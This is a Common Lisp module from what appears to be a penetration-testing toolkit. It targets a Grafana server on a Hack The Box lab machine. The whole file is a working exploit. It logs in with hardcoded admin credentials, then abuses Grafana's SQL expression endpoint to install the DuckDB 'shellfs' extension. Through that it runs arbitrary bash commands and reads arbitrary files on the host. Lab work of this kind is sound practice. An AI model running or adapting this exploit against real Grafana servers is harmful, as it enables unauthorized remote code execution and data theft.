(in-package :grimoire)

(defparameter *planning/user* "admin")
(defparameter *planning/pass* "0D5oT70Fq13EvB5r")

(defparameter *planning/api* "http://grafana.planning.htb")
(defparameter *planning/api-query*
  (fmt "~a/api/ds/query?ds_type=__expr__&expression=true&requestId=Q101"
       *planning/api*))
(defparameter *planning/api-user*
  (fmt "~a/login/" *planning/api*))

(defvar *planning/cookies* (cl-cookie:make-cookie-jar))
(defvar *planning/exec-query* "SELECT 1;install shellfs from community;LOAD shellfs;SELECT * FROM read_csv('bash -c \"~a\" > ~a 2>&1 |')")

(defun planning/payload (query)
  (s:dict
   :from "1729313027261"
   :queries (list
             (s:dict 
              :datasource (s:dict
                           "name" "Expression"
                           "type" "__expr__"
                           "uid" "__expr__")
              :expression query
              :hide nil
              :refId "B"
              :type "sql"
              :window ""))
   :to "1729334627261"))

(defun planning/login ()
  (dex:post *planning/api-user*
            :content (jzon:stringify
                      (s:dict "user" *planning/user*
                              "password" *planning/pass*))
            :headers `(("Content-Type" . "application/json"))
            :cookie-jar *planning/cookies*))

(defun planning/query (query)
  (flet ((req (q) 
           (dex:post
            *planning/api-query* 
            :content (jzon:stringify (planning/payload q))
            :headers `(("Content-Type" . "application/json"))
            :cookie-jar *planning/cookies*)))
    (let ((response (handler-case (req query)
                      (dex:http-request-failed ()
                        (planning/login) (req query)))))
      (@2 (jzon:parse response) 
          "results" "A" "frames" 0 "data" "values" 0 0))))

(define-capability :read planning (file)
  (let* ((text (str:replace-all
                "\\x0A" (fmt "~%")
                (planning/query
                 (fmt "SELECT content FROM read_blob(\"~a\")"
                      file))))
         (text-len (1- (length text))))
    (if (plusp text-len)
        (subseq text 0 text-len)
        "")))

(define-capability :exec planning (command)
  (let ((output "/tmp/grafana-cmd-output"))
    (planning/query (fmt *planning/exec-query* command output))
    (use :read output)))